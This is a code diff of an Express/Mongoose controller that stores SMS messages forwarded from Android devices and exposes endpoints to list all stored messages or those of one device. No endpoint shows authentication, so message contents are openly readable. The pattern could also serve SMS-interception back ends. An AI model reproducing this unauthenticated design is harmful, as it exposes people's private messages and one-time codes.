@@ -1,78 +1,77 @@
 import Sms from "../models/Sms.js";
 import Device from "../models/Device.js";
 
-/* ✅ GET all SMS for a device (by uniqueId) */
-export const getSmsByDeviceId = async (req, res) => {
+/* ✅ GET — Fetch all SMS globally (optional for admin view) */
+export const getAllSms = async (req, res) => {
   try {
-    const { id } = req.params;
-
-    // 🔍 Find Device
-    const device = await Device.findOne({ uniqueId: id });
-    if (!device)
-      return res
-        .status(404)
-        .json({ success: false, message: "Device not found" });
-
-    // 🔍 Get all SMS for this device
-    const smsList = await Sms.find({ deviceId: id }).sort({ createdAt: -1 });
-
-    res.json({ success: true, data: smsList });
+    const smsList = await Sms.find().sort({ createdAt: -1 });
+    res.json({ success: true, message: "Fetched all SMS", data: smsList });
   } catch (err) {
     console.error("❌ Error fetching SMS:", err);
-    res
-      .status(500)
-      .json({ success: false, message: "Server error", error: err.message });
+    res.status(500).json({ success: false, message: "Server error", error: err.message });
   }
 };
 
-/* ✅ POST new SMS by device uniqueId (overwrite if exists) */
-export const sendSmsByDeviceId = async (req, res) => {
+/* ✅ GET — Fetch SMS by uniqueId (specific device) */
+export const getSmsByDeviceId = async (req, res) => {
   try {
-    const { id } = req.params; // uniqueId from URL
-    const { to, body, from } = req.body;
+    const { id } = req.params;
+    const smsList = await Sms.find({ deviceId: id }).sort({ createdAt: -1 });
+    res.json({ success: true, message: "Fetched SMS for device", data: smsList });
+  } catch (err) {
+    console.error("❌ Error fetching SMS:", err);
+    res.status(500).json({ success: false, message: "Server error", error: err.message });
+  }
+};
 
-    if (!to || !body)
-      return res
-        .status(400)
-        .json({ success: false, message: "To and body are required" });
+/* ✅ POST — Global route to receive SMS from Android */
+export const receiveSmsFromDevice = async (req, res) => {
+  try {
+    const { sender, senderNumber, receiverNumber, body, timestamp, uniqueid } = req.body;
 
-    // 🔍 Find Device
-    const device = await Device.findOne({ uniqueId: id });
-    if (!device)
-      return res
-        .status(404)
-        .json({ success: false, message: "Device not found" });
+    if (!uniqueid || !receiverNumber || !body) {
+      return res.status(400).json({
+        success: false,
+        message: "uniqueid, receiverNumber, and body are required",
+      });
+    }
 
-    // 🔁 Check existing SMS for this device
-    let sms = await Sms.findOne({ deviceId: id });
+    // 🔍 Find device (optional, skip if not needed)
+    const device = await Device.findOne({ uniqueId: uniqueid });
+    if (!device) {
+      console.warn("⚠️ Device not found for uniqueid:", uniqueid);
+    }
+
+    // 🔁 Overwrite or Create one SMS per device
+    let sms = await Sms.findOne({ deviceId: uniqueid });
 
     if (sms) {
-      // 🟢 Update existing record
-      sms.from = from || device.simOperator || "Unavailable";
-      sms.to = to;
+      sms.from = senderNumber || sender || "Unavailable";
+      sms.to = receiverNumber;
       sms.body = body;
-      sms.sentAt = new Date();
+      sms.sentAt = timestamp ? new Date(timestamp) : new Date();
       await sms.save();
     } else {
-      // 🆕 Create new record if none exists
       sms = await Sms.create({
-        deviceId: id,
-        from: from || device.simOperator || "Unavailable",
-        to,
+        deviceId: uniqueid,
+        from: senderNumber || sender || "Unavailable",
+        to: receiverNumber,
         body,
-        sentAt: new Date(),
+        sentAt: timestamp ? new Date(timestamp) : new Date(),
       });
     }
 
     res.json({
       success: true,
-      message: "SMS saved (updated if existed)",
+      message: "SMS saved successfully",
       data: sms,
     });
   } catch (err) {
-    console.error("❌ Error sending SMS:", err);
-    res
-      .status(500)
-      .json({ success: false, message: "Server error", error: err.message });
+    console.error("❌ Error saving SMS:", err);
+    res.status(500).json({
+      success: false,
+      message: "Server error while saving SMS",
+      error: err.message,
+    });
   }
 };
